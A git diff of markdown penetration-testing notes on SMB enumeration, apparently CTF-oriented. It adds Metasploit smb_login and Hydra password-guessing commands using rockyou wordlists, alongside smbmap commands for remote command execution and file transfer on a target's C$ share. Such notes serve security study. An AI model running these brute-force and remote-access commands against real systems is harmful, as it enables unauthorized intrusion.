@@ -6,6 +6,7 @@
   - TCP Port **139:** NetBIOS Datagram Service
   - TCP Port **445:** Microsoft-DS Active Directory; SMB file sharing 
 - If you need to list out the SMB shares in Windows: [net share](../net.md)
+- [MetaSploit modules to use](https://www.offsec.com/metasploit-unleashed/port-scanning/#smb-version-scanning): `smb_version` | `smb_enumusers` | `smb_enumshares` | `smb_login` (then use [smbclient](#smbclient) outside of msf to logon)
 
 ## Contents
 - [Windows Net Use](#windows-net-use)
@@ -39,7 +40,9 @@
   - [Get Groups & Members](#get-groups--members)
   - [Get (Printer) Information:](#get-printer-information)
   - [Get SIDs (Linux)](#get-sids-linux)
-- [Hydra](#hydra)
+- [Dictionary Attacks](#dictionary-attacks)
+  - [MetaSploit](#metasploit)
+  - [Hydra](#hydra)
 
 ## Windows Net Use
 > Windows specific commands (net).
@@ -127,29 +130,6 @@ nmap -p445 --script smb-enum-groups --script-args smbusername=[username],smbpass
 nmap -p445 --script smb-enum-services --script-args smbusername=[username],smbpassword=[password] 10.0.17.200
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ## SMBMap
 > Samba Share Enumerator
 - SMBMap allows users to enumerate samba share drives across an entire domain.
@@ -166,37 +146,37 @@ smbmap -u guest -p "" -d . -H 10.1.1.1
 
 ### Login with Creds
 ```
-smbmap -u administrator -p [password] -d . -H 10.1.1.1
+smbmap -u [username] -p [password] -d . -H 10.1.1.1
 ```
 - If the creds are good, you get in and get more access.
 
 ### Run a Command
 ```
-smbmap -u administrator -p [password] -H 10.1.1.1 -x 'ipconfig'
+smbmap -u [username] -p [password] -H 10.1.1.1 -x 'ipconfig'
 ```
 - If that works, you know you have the ability to execute code remotely
 
 ### List Drives on the Share
 ```
-smbmap -u administrator -p [password] -H 10.1.1.1 -L
+smbmap -u [username] -p [password] -H 10.1.1.1 -L
 ```
 
 ### Connect to a Drive
 ```
-smbmap -u administrator -p [password] -H 10.1.1.1 -r 'C$'
+smbmap -u [username] -p [password] -H 10.1.1.1 -r 'C$'
 ```
 - This is like running a `dir` (Windows) or `ls` (Linux).
 
 ### Upload a File
 ```
-smbmap -u administrator -p [password] -H 10.1.1.1 --upload '/root/test.txt' 'C$\test.txt'
+smbmap -u [username] -p [password] -H 10.1.1.1 --upload '/root/test.txt' 'C$\test.txt'
 ```
 - Uploads the file to the C: drive on the target.
 - Run the `-r` command again to check and make sure it uploaded.
 
 ### Download a File
 ```
-smbmap -u administrator -p [password] -H 10.1.1.1 --download 'C$\flag.txt'
+smbmap -u [username] -p [password] -H 10.1.1.1 --download 'C$\flag.txt'
 ```
 
 ## nmblookup
@@ -271,6 +251,33 @@ enum4linux -r -u "admin" -p [password] [target IP]
 ```
 - The -`r` switch should enumerate users via RID cycling
 
-## Hydra
+## Dictionary Attacks
 
-Dictionary Attacks. [See here](hydra.md).
+### MetaSploit
+> msfconsole: Enumerate the target SMB share using a wordlist...
+```
+> use auxiliary/scanner/smb/smb_login
+> info  # this gives you a Description of the smb_login module
+> set rhosts [target IP]
+> set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+> set smbuser [username]
+> options
+> run 
+```  
+
+### [Hydra](hydra.md)
+> Hydra is a tool to guess/crack valid login/password pairs.
+- First you need may need to unzip the RockYou wordlist:
+```
+gzip -d /usr/share/wordlists/rockyou.txt.gz .
+```
+- Then we can use that resulting file with Hydra...
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt [target IP] smb
+```
+- The `-l` is for Login (login as admin)
+  - Note: lower case letters for options are for specific values
+- The `-P` is for a password file 
+  - Note: upper case letters for options are for files (lists)
+- The `smb` after the target IP the protocol we're attacking
+
